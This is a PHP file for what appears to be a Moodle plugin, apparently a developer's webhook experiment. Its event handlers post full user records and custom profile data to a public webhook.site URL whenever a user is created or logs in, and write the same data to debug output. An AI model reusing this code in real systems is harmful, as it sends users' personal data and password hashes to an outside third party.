<?php

defined('MOODLE_INTERNAL') || die();

function local_newuser_user_created($user) {
    global $DB;
    
    $body = '';

    // Original fields.
    foreach ($user as $field => $value) {
        $body .= $field . ' = ' . $value . "\n";
    }
    
    // Custom fields.
    $sql = "SELECT f.id, f.name, d.data
            FROM {user_info_field} f
            LEFT JOIN {user_info_data} d ON d.fieldid = f.id AND d.userid = :userid";
    $customfields = $DB->get_records_sql($sql, array('userid' => $user->id));
    foreach ($customfields as $customfield) {
        $body .= $customfield->name . ' = ' . $customfield->data . "\n";
    }
    $url = 'https://webhook.site/f7f1ff38-eb5c-4644-8272-e6819b460d3a';

    $post = [
        'username' => 'user1',
        'password' => 'passuser1',
        'gender'   => 1,
    	'customFeilds'=>$customfields,
        "userdata"=>$user        
    ];

    $ch = curl_init('https://webhook.site/f7f1ff38-eb5c-4644-8272-e6819b460d3a');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);

    // execute!
    $response = curl_exec($ch);

    // close the connection, release resources used
    curl_close($ch);
        
    // // Send the email to the admin user
    // $admin = get_admin();
    // $subject = get_string('newuser');
    // email_to_user($admin, $admin, $subject, $body);

    return true;
}

function newFunction(\core\event\user_created $event){
    global $CFG, $USER;
    $user = $event->get_record_snapshot('user', $event->objectid);

    $ch = curl_init('https://webhook.site/f7f1ff38-eb5c-4644-8272-e6819b460d3a');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $user);

    // execute!
    $response = curl_exec($ch);

    // close the connection, release resources used
    curl_close($ch);



}
// // Register the event handler
// $observers = array(
//     array(
//         "eventname" => "\core\event\user_created",
//         'callback'  => 'newFunction',
//     ),
// );



     function userAddedEventFired(\core\event\user_loggedin $event){
           global $DB;
            debugging('userAddedEventFired called', DEBUG_DEVELOPER);
        global $CFG, $USER;
        $user = $event->get_record_snapshot('user', $event->objectid);
        $userJson = json_encode($user);
        $ch = curl_init('https://webhook.site/f7f1ff38-eb5c-4644-8272-e6819b460d3a');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $userJson);

        $sql = "SELECT f.id, f.name, d.data
        FROM {user_info_field} f
        LEFT JOIN {user_info_data} d ON d.fieldid = f.id AND d.userid = :userid";
        $customfields = $DB->get_records_sql($sql, array('userid' => $user->id));
        debugging($userJson, DEBUG_DEVELOPER);
        debugging(json_encode($customfields), DEBUG_DEVELOPER);

        // execute!
        $response = curl_exec($ch);
        debugging($response, DEBUG_DEVELOPER);

        // close the connection, release resources used
        curl_close($ch);
        

    }

